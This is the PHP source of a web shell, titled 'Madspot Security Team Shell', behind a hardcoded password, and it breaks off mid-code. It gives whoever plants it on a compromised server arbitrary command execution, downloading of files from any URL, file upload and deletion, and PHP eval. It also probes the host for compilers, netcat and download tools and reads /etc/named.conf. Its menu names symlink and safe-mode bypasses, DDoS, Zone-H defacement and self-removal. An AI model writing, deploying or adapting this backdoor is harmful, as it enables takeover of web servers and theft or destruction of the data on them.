<?php session_start();
 $password = "under"; // sifre(degistirebilirsiniz)
 $pass = $_POST['pass'];
 $form = "<form method='POST'>
	<input type='password' name='pass'><input type='submit' value='Login !'>
	</form>";
 if( !isset($_SESSION['sec']) ){ $_SESSION['sec'] = false;
 } if(isset($pass)) { if($pass == $password) { $_SESSION['sec'] = true;
 } else { die( "{$form} <br> <H1>Error");
 } } if(!$_SESSION['sec']): echo $form;
 exit();
 endif;
 if($_GET['log'] == 'out') { session_destroy();
 } echo "UnderFamily | <a href='?log=out'>Çıkış yap</a>";
 
?>
<div style="display: none;">
<input id="url_1" value="<?php echo base64_encode($_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']); ?>">
<input id="url_2" value="<?php echo base64_encode($_SERVER['SERVER_NAME']); ?>">
</div>
</form>
<?php  @define('VERSION','1.0'); @error_reporting(E_ALL ^ E_NOTICE); @session_start(); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('max_execution_time',0); @set_time_limit(0); @set_magic_quotes_runtime(0); if(get_magic_quotes_gpc()) { function madstripslashes($array) { return is_array($array) ? array_map('madstripslashes', $array) : stripslashes($array); } $_POST = madstripslashes($_POST); } $default_action = 'FilesMan'; $default_use_ajax = true; $default_charset = 'Windows-1251'; if (strtolower(substr(PHP_OS,0,3))=="win") $sys='win'; else $sys='unix'; $home_cwd = @getcwd(); if(isset($_POST['c'])) @chdir($_POST['c']); $cwd = @getcwd(); if($sys == 'win') { $home_cwd = str_replace("\\", "/", $home_cwd); $cwd = str_replace("\\", "/", $cwd); } if($cwd[strlen($cwd)-1] != '/' ) $cwd .= '/'; function madEx($in) { $out = ''; if (function_exists('exec')) { @exec($in,$out); $out = @join("\n",$out); } elseif (function_exists('passthru')) { ob_start(); @passthru($in); $out = ob_get_clean(); } elseif (function_exists('system')) { ob_start(); @system($in); $out = ob_get_clean(); } elseif (function_exists('shell_exec')) { $out = shell_exec($in); } elseif (is_resource($f = @popen($in,"r"))) { $out = ""; while(!@feof($f)) $out .= fread($f,1024); pclose($f); } return $out; } $down=@getcwd(); if($sys=="win") $down.='\\'; else $down.='/'; if(isset($_POST['rtdown'])) { $url = $_POST['rtdown']; $newfname = $down. basename($url); $file = fopen ($url, "rb"); if ($file) { $newf = fopen ($newfname, "wb"); if ($newf) while(!feof($file)) { fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 ); } } if ($file) { fclose($file); } if ($newf) { fclose($newf); } } function madhead() { if(empty($_POST['charset'])) $_POST['charset'] = $GLOBALS['default_charset']; $freeSpace = @diskfreespace($GLOBALS['cwd']); $totalSpace = @disk_total_space($GLOBALS['cwd']); $totalSpace = $totalSpace?$totalSpace:1; $on="<font color=#CC9900> ON </font>"; $of="<font color=red> OFF </font>"; $none="<font color=#CC9900> NONE </font>"; if(function_exists('curl_version')) $curl=$on; else $curl=$of; if(function_exists('mysql_get_client_info')) $mysql=$on; else $mysql=$of; if(function_exists('mssql_connect')) $mssql=$on; else $mssql=$of; if(function_exists('pg_connect')) $pg=$on; else $pg=$of; if(function_exists('oci_connect')) $or=$on; else $or=$of; if(@ini_get('disable_functions')) $disfun=@ini_get('disable_functions'); else $disfun="All Functions Enable"; if(@ini_get('safe_mode')) $safe_modes="<font color=red>ON</font>"; else $safe_modes="<font color=#CC9900 >OFF</font>"; if(@ini_get('open_basedir')) $open_b=@ini_get('open_basedir'); else $open_b=$none; if(@ini_get('safe_mode_exec_dir')) $safe_exe=@ini_get('safe_mode_exec_dir'); else $safe_exe=$none; if(@ini_get('safe_mode_include_dir')) $safe_include=@ini_get('safe_mode_include_dir'); else $safe_include=$none; if(!function_exists('posix_getegid')) { $user = @get_current_user(); $uid = @getmyuid(); $gid = @getmygid(); $group = "?"; } else { $uid = @posix_getpwuid(posix_geteuid()); $gid = @posix_getgrgid(posix_getegid()); $user = $uid['name']; $uid = $uid['uid']; $group = $gid['name']; $gid = $gid['gid']; } $cwd_links = ''; $path = explode("/", $GLOBALS['cwd']); $n=count($path); for($i=0; $i<$n-1; $i++) { $cwd_links .= "<a  href='#' onclick='g(\"FilesMan\",\""; for($j=0; $j<=$i; $j++) $cwd_links .= $path[$j].'/'; $cwd_links .= "\")'>".$path[$i]."/</a>"; } $drives = ""; foreach(range('c','z') as $drive) if(is_dir($drive.':\\')) $drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> '; echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Madspot Security Team Shell</title>
<style type="text/css">

<!--
.whole {
	background-color: #CCC;
	height:auto;
	width: auto;
	margin-top: 10px;
	margin-right: 10px;
	margin-left: 10px;
}
.header {
	height: auto;
	width: auto;
	border: 7px solid #CCC;
	color: #999;
	font-size: 12px;
	font-family: Verdana, Geneva, sans-serif;
	background-color: #000;
}
.header a {color:#CC9900; text-decoration:none;}
span {
	font-weight: bolder;
	color: #FFF;
}
#meunlist {
	font-family: Verdana, Geneva, sans-serif;
	color: #FFF;
	background-color: #000;
	width: auto;
	border-right-width: 7px;
	border-left-width: 7px;
	border-top-style: solid;
	border-right-style: solid;
	border-bottom-style: solid;
	border-left-style: solid;
	border-top-color: #CCC;
	border-right-color: #CCC;
	border-bottom-color: #CCC;
	border-left-color: #CCC;
	height: auto;
	font-size: 12px;
	font-weight: bold;
	border-top-width: 0px;
}
  .whole #meunlist ul {
	padding-top: 5px;
	padding-right: 5px;
	padding-bottom: 7px;
	padding-left: 2px;
	text-align:center;
	list-style-type: none;
	margin: 0px;
}
  .whole #meunlist li {
	margin: 0px;
	padding: 0px;
	display: inline;
}
  .whole #meunlist a {
    font-family: arial, sans-serif;
	font-size: 14px;
	text-decoration:none;
	font-weight: bold;
	color: #fff;
	clear: both;
	width: 100px;
	margin-right: -6px;
	padding-top: 3px;
	padding-right: 15px;
	padding-bottom: 3px;
	padding-left: 15px;
	border-right-width: 1px;
	border-right-style: solid;
	border-right-color: #FFF;
}
  .whole #meunlist a:hover {
	color: #000;
	background: #fff;
}

.foot {
	font-family: Verdana, Geneva, sans-serif;
	background-color: #000;
	margin: 0px;
	padding: 0px;
	width: 100%;
	text-align: center;
	font-size: 12px;
	color: #CCC;
	border-right-width: 7px;
	border-left-width: 7px;
    border-bottom-width: 7px;
    border-bottom-style: solid;
    border-right-style: solid;
    border-right-style: solid;
	border-left-style: solid;
	border-top-color: #CCC;
	border-right-color: #CCC;
	border-bottom-color: #CCC;
	border-left-color: #CCC;
}'; if(is_writable($GLOBALS['cwd'])) { echo ".foottable {
    width: 300px;
    font-weight: bold;
    }";} else { echo ".foottable {
    width: 300px;
    font-weight: bold;
    background-color:red;
    }
    .dir {
      background-color:red;  
    }
    "; } echo '.main th{text-align:left;}
 .main a{color: #FFF;}
 .main tr:hover{background-color:red;}
 .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
 .bigarea{ width:99%; height:300px; }   
  </style>

'; echo "<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}</script>"; echo '
</head>

<body bgcolor="#000000"  leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div class="whole">
<form method=post name=mf style="display:none;">
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>
  <div class="header"><table width="100%" border="0"  align="lift">
  <tr>
    <td width="3%"><span>Uname:</span></td>
    <td colspan="2">'.substr(@php_uname(), 0, 120).'</td>
    </tr>
  <tr>
    <td><span>User:</span></td>
    <td>'. $uid . ' [ ' . $user . ' ] <span>   Group: </span>' . $gid . ' [ ' . $group . ' ] </td>
    <td width="14%" rowspan="8"></td>
  </tr>
  <tr>
    <td><span>PHP:</span></td>
    <td>'.@phpversion(). '   <span>   Safe Mode:'.$safe_modes.'</span></td>
    </tr>
  <tr>
    <td><span>Our IP:</span></td>
    <td>'.@$_SERVER["SERVER_ADDR"].'    <span>Server IP:</span> '.@$_SERVER["REMOTE_ADDR"].'</td>
  </tr>
  <tr>
    <td><span>WEBS:</span></td>
    <td width="76%">'; if($GLOBALS['sys']=='unix') { $d0mains = @file("/etc/named.conf"); if(!$d0mains) { echo "CANT READ named.conf"; } else { $count; foreach($d0mains as $d0main) { if(@ereg("zone",$d0main)) { preg_match_all('#zone "(.*)"#', $d0main, $domains); flush(); if(strlen(trim($domains[1][0])) > 2){ flush(); $count++; } } } echo "$count  Domains"; } } else{ echo"CANT READ |Windows|";} echo '</td>
    </tr>
    <tr>
    <td height="16"><span>HDD:</span></td>
    <td>'.madSize($totalSpace).' <span>Free:</span>' . madSize($freeSpace) . ' ['. (int) ($freeSpace/$totalSpace*100) . '%]</td>
    </tr>'; if($GLOBALS['sys']=='unix' ) { if(!@ini_get('safe_mode')) { echo '<tr><td height="18" colspan="2"><span>Useful : </span>'; $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl'); foreach($userful as $item) if(madWhich($item)) echo $item.','; echo '</td>
         </tr>
          <tr>
          <td height="0" colspan="2"><span>Downloader:</span>'; $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror'); foreach($downloaders as $item2) if(madWhich($item2)) echo $item2.','; echo '</td>
              </tr>'; } else { echo '<tr><td height="18" colspan="2"><span>useful:</span>'; echo '--------------</td>
           </tr><td height="0" colspan="2"><span>Downloader: </span>-------------</td>
              </tr>'; } } else { echo '<tr><td height="18" colspan="2"><span>Window:</span>'; echo madEx('ver'); echo '</td>
         </tr> <tr>
        <td height="0" colspan="2"><span>Downloader: </span>-------------</td>
              </tr>'; } echo '<tr>
    <td height="16" colspan="2"><span>Disabled functions:</span>'.$disfun.'</td>
  </tr>
  <tr>
    <td height="16" colspan="2"><span>cURL:'.$curl.'  MySQL:'.$mysql.'  MSSQL:'.$mssql.'  PostgreSQL:'.$pg.'  Oracle: </span>'.$or.'</td><td width="15%">'.base64_decode("PGEgaHJlZj0iaHR0cDovL3IwMHQuaW5mby8iIHRhcmdldD0iX2JsYW5rIj48c3Bhbj48Zm9udCBjb2xvcj0iI0NDOTkwMCI+Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7Jm5ic3A7U0hFTEwtQVJDSMSwVkU8L2ZvbnQ+PC9zcGFuPjwvYT4=").'</td>
  </tr>
  <tr>
  <td height="11" colspan="3"><span>Open_basedir:'.$open_b.' Safe_mode_exec_dir:'.$safe_exe.'   Safe_mode_include_dir:'.$safe_include.'</td>
  </tr>
  <tr>
    <td height="11"><span>Server </span></td>
    <td colspan="2">'.@getenv('SERVER_SOFTWARE').'</td>
  </tr>'; if($GLOBALS[sys]=="win") { echo '<tr>
    <td height="12"><span>DRIVE:</span></td>
    <td colspan="2">'.$drives.'</td>
     </tr>'; } echo '<tr>
    <td height="12"><span>PWD:</span></td>
    <td colspan="2">'.$cwd_links.'  <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')"><font color=red >|CURRENT|</font></a></td>
  </tr>
  </table>
</div>
 <div id="meunlist">
      <ul>
<li><a href="#" onclick="g(\'FilesMan\',null,\'\',\'\',\'\')">HOME</a></li>

<li><a href="#" onclick="g(\'proc\',null,\'\',\'\',\'\')">PROCESS</a></li>
<li><a href="#" onclick="g(\'phpeval\',null,\'\',\'\',\'\')">EVAL</a></li>
<li><a href="#" onclick="g(\'sql\',null,\'\',\'\',\'\')">SQL</a></li>
<li><a href="#" onclick="g(\'hash\',null,\'\',\'\',\'\')">HASH</a></li>
<li><a href="#" onclick="g(\'connect\',null,\'\',\'\',\'\')">CONNECT</a></li>
<li><a href="#" onclick="g(\'zoneh\',null,\'\',\'\',\'\')">ZONE-H</a></li>
<li><a href="#" onclick="g(\'dos\',null,\'\',\'\',\'\')">DDOS</a></li>
<li><a href="#" onclick="g(\'safe\',null,\'\',\'\',\'\')">SAFE MODE</a></li>
<li><a href="#" onclick="g(\'symlink\',null,\'\',\'\',\'\')">SYMLINK</a></li>
<li><a href="#" onclick="g(\'spot\',null,\'\',\'\',\'\')">MADSPOT</a></li>
<li><a href="#" onclick="g(\'selfrm\',null,\'\',\'\',\'\')">KIll C0de</a></li>
</ul>
    
    </div>
'; } function madfooter() { echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
       <tr>
         <td width='17%'><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>__MK FILE__</span><br><input class='dir'  type=text name=f value=''><input type=submit value='>>'></form></td>
         <td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>__MK DIR__</span><br><input class='dir' type=text name=d value=''><input type=submit value='>>'></form></td>
         <td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);return false;\"><span>__DELETE__</span><br><input class='dir' type=text name=del value=''><input type=submit value='>>'></form></td>
         <td width='19%'><form onsubmit=\"g('FilesTools',null,this.f.value,'chmod');return false;\"><span>__CHMOD__</span><br><input class='dir' type=text name=f value=''><input type=submit value='>>'></form></td>
       </tr>
       <tr>
         <td colspan='2'><form onsubmit='g(null,this.c.value,\"\");return false;'><span>__CHANGE DIR__</span><br><input class='foottable' type=text name=c value='".htmlspecialchars($GLOBALS['cwd'])."'><input type=submit value='>>'></form></td>
         <td colspan='2'><form method='post' ><span>__HTTP DOWNLOAD__</span><br><input class='foottable' type=text name=rtdown value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>
         <td colspan='4'><form onsubmit=\"g('proc',null,this.c.value);return false;\"><span>__EXECUTE__</span><br><input class='foottable' type=text name=c value=''><input type=submit value='>>'></form></td>
        </tr>
       <tr>
         <td colspan='4'><form method='post' ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMAn'>
		<input type=hidden name=c value='" . $GLOBALS['cwd'] ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
        <span>Upload file:</span><br><input class='toolsInp' type=file name=f><br /><input type=submit value='>>'></form></td>
        </tr> 
      </table>
  </div>
  </body>
</html>
"; } if (!function_exists("posix_getpwuid") && (strpos(@ini_get('disable_functions'), 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} } if (!function_exists("posix_getgrgid") && (strpos(@ini_get('disable_functions'), 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} } function madWhich($p) { $path = madEx('which ' . $p); if(!empty($path)) return $path; return false; } function madSize($s) { if($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824 ). ' GB'; elseif($s >= 1048576) return sprintf('%1.2f', $s / 1048576 ) . ' MB'; elseif($s >= 1024) return sprintf('%1.2f', $s / 1024 ) . ' KB'; else return $s . ' B'; } function madPerms($p) { if (($p & 0xC000) == 0xC000)$i = 's'; elseif (($p & 0xA000) == 0xA000)$i = 'l'; elseif (($p & 0x8000) == 0x8000)$i = '-'; elseif (($p & 0x6000) == 0x6000)$i = 'b'; elseif (($p & 0x4000) == 0x4000)$i = 'd'; elseif (($p & 0x2000) == 0x2000)$i = 'c'; elseif (($p & 0x1000) == 0x1000)$i = 'p'; else $i = 'u'; $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-'); $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-')); $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-'); $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-')); $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-'); $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-')); return $i; } function madPermsColor($f) { if (!@is_readable($f)) return '<font color=#FF0000>' . madPerms(@fileperms($f)) . '</font>'; elseif (!@is_writable($f)) return '<font color=white>' . madPerms(@fileperms($f)) . '</font>'; else return '<font color=#25ff00>' . madPerms(@fileperms($f)) . '</font>'; } if(!function_exists("scandir")) { function scandir($dir) { $dh = opendir($dir); while (false !== ($filename = readdir($dh))) $files[] = $filename; return $files; } } function madFilesMan() { madhead(); echo '<div class=header><script>p1_=p2_=p3_="";</script>'; if(!empty($_POST['p1'])) { switch($_POST['p1']) { case 'uploadFile': if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload file!"; break; case 'mkdir': if(!@mkdir($_POST['p2'])) echo "Can't create new dir"; break; case 'delete': function deleteDir($path) { $path = (substr($path,-1)=='/') ? $path:$path.'/'; $dh = opendir($path); while ( ($item = readdir($dh) ) !== false) { $item = $path.$item; if ( (basename($item) == "..") || (basename($item) == ".") ) continue; $type = filetype($item); if ($type == "dir") deleteDir($item); else @unlink($item); } closedir($dh); @rmdir($path); } if(is_dir(@$_POST['p2'])) deleteDir(@$_POST['p2']); else @unlink(@$_POST['p2']); break; default: if(!empty($_POST['p1'])) { $_SESSION['act'] = @$_POST['p1']; $_SESSION['f'] = @$_POST['f']; foreach($_SESSION['f'] as $k => $f) $_SESSION['f'][$k] = urldecode($f); $_SESSION['c'] = @$_POST['c']; } break; } } $dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']); if($dirContent === false) { echo '<h3><span>|  Access Denied! |</span></h3></div>';madFooter(); return; } global $sort; $sort = array('name', 1); if(!empty($_POST['p1'])) { if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match)) $sort = array($match[1], (int)$match[2]); } echo "
<table width='100%' class='main' cellspacing='0' cellpadding='2'  >
<form name=files method=post><tr><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>"; $dirs = $files = array(); $n = count($dirContent); for($i=0;$i<$n;$i++) { $ow = @posix_getpwuid(@fileowner($dirContent[$i])); $gr = @posix_getgrgid(@filegroup($dirContent[$i])); $tmp = array('name' => $dirContent[$i], 'path' => $GLOBALS['cwd'].$dirContent[$i], 'modify' => @date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])), 'perms' => madPermsColor($GLOBALS['cwd'] . $dirContent[$i]), 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]), 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]), 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i]) ); if(@is_file($GLOBALS['cwd'] . $dirContent[$i])) $files[] = array_merge($tmp, array('type' => 'file')); elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path']))); elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&& ($dirContent[$i] != ".")) $dirs[] = array_merge($tmp, array('type' => 'dir')); } $GLOBALS['sort'] = $sort; function wsoCmp($a, $b) { if($GLOBALS['sort'][0] != 'size') return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1); else return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1); } usort($files, "wsoCmp"); usort($dirs, "wsoCmp"); $files = array_merge($dirs, $fi
